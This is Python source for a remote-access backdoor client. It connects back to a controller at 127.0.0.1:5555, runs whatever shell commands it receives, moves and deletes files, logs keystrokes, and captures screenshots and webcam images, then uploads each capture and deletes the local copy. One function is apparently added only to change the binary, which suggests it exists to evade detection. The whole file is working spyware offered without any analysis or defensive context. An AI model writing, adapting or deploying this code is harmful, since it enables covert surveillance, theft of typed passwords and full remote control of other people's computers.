import socket
import time
import json
import subprocess
import os
import threading
from pynput import keyboard
import pyautogui
import datetime
import cv2



#keylogger class

class KeyLogger:
    
    def __init__(self):
        self.keylog = []
        self.thread = None
        self.running = False
        self.listener = None
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.space:
                self.keylog.append(' ')
            elif key == keyboard.Key.enter:
                self.keylog.append('\n')
            elif key == keyboard.Key.backspace:
                self.keylog.append('<backspace>')
            else:
                self.keylog.append(key.char)
        except AttributeError:
            self.keylog.append(str(key))
    
    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self.run)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()
        if self.thread:
            self.thread.join()
    
    def save(self, file_name):
        with open(file_name, "w") as f:
            f.write(''.join(self.keylog))
            
    
    def run(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            self.listener = listener
            while self.running:
                time.sleep(0.1)  # Small delay to prevent high CPU usage
    

def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            part = s.recv(1024).decode().rstrip()
            data += part
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    f = open(file_name,'rb')
    s.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def delete_file(file_name):
    try:
        new_file_name = os.path.join(os.getcwd(),file_name)
        os.remove(new_file_name)
    except FileNotFoundError:
        e
    except Exception as e:
        e

#   Handels keylogger stop
def stop_keylogger(keyLogger, file_name):
    if keyLogger:
        keyLogger.stop()
        keyLogger.save(file_name)
        upload_file(file_name)
        delete_file(file_name)
    else:
        send = 'No keylogger running.'
        reliable_send(send)

#   Starts keylogger
def start_keylogger(keyLogger):
    if keyLogger:
        pass
    else:
        keyLogger = KeyLogger()
        keyLogger.start()
        return keyLogger

#   Screenshot function 
def take_screenshot():
    screenshot = pyautogui.screenshot()
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
    screenshot_path = f"screenshot_{current_time}.png"
    screenshot.save(screenshot_path)
    upload_file(screenshot_path)
    delete_file(screenshot_path)


def webcam_snapshot():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        return
    ret, frame = cap.read()
    if not ret:
            return
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
    filename= f"webcam-capture_{current_time}.jpg"
    cv2.imwrite(filename,frame)
    upload_file(filename)
    delete_file(filename)
    cap.release()


def shell():
    keyLogger = None # starts object keylogger
    while True:
        command = reliable_recv()
        if command == 'quit':
            break

        elif command[:3] == 'cd ':
            os.chdir(command[3:])

        elif command == 'clear':
            pass

        elif command == "help":
            pass

        elif command[:8] == 'download':
            upload_file(command[9:])

        elif command[:6] == 'upload':
            download_file(command[7:])

        elif command == 'start-keylogger':
            keyLogger = start_keylogger(keyLogger)

        elif command[:14] == 'stop-keylogger':        
            file_name = command[15:]
            stop_keylogger(keyLogger, file_name)

        elif command[:11] == 'delete-file':
            delete_file(command[12:])
        
        elif command == 'screenshot':
            take_screenshot()

        elif command == 'webcam-snap':
            webcam_snapshot()

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            reliable_send(result.decode())

def connection():
    while True:
        try:
            s.connect(('127.0.0.1', 5555))
            shell()
            s.close()
            break
        except:
            time.sleep(20)

#added this function to change binary
def nothing():
    print("nothing")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
